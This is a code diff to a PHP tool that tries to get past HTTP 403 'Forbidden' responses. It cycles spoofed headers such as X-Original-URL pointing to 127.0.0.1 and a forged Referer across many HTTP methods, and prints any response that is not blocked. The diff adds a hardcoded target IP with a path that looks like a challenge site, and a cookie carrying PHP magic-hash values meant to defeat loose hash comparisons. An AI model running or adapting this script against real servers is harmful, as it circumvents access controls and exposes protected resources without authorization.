@@ -6,6 +6,10 @@
     readline_add_history($Cookie); //save input
     $ch =" ";
     $status = false;
+
+    //  //if you want to test this tool uncomment this two line  below <------------------------------
+    $url = "http://52.28.216.196/skiddy/robots.txt.php";   // <===========
+    $Cookie ="flag=240610708; flag1=QNKCDZO";             // <============
     $bypass = [  
         'X-Original-URL:127.0.0.1',
         'Referer:'.$url,
@@ -18,7 +22,9 @@
         'POST' => CURLOPT_POST,
         'GET' => CURLOPT_HTTPGET,
         'PUT' => CURLOPT_PUT,
-        'CAPTH' => CURLOPT_CAPATH
+        'HEAD' => CURLOPT_HEADER,
+        'OPTIONS' => " ",
+        "PATCH" => " ",
     ];
 foreach ($bypass as $bypas){
     foreach ($methods as $key => $method){   
@@ -27,7 +33,7 @@ foreach ($bypass as $bypas){
     curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
     curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
     curl_setopt( $ch, CURLOPT_HEADER, false );
-    curl_setopt( $ch, $method, 1);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $key);
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'Cache-Control: max-age=0',
     $bypas,
@@ -41,11 +47,12 @@ foreach ($bypass as $bypas){
     $pos = strpos($result, 'Forbidden');
     
     echo "\n trying : ".$key." : \033[33m $bypas \033[0m\n";
-    if ($pos != true){
-        echo "$key \n \033[32m$bypas \033[0m\n";
+    if ($pos != True){
+        echo " \n \n found method : $key  \033[32m$bypas \033[0m\n";
         printf("\033[36m $result \033[0m\n");
         curl_close( $ch );
         $status = true;
+        
         }
     }
 }if($status == false){
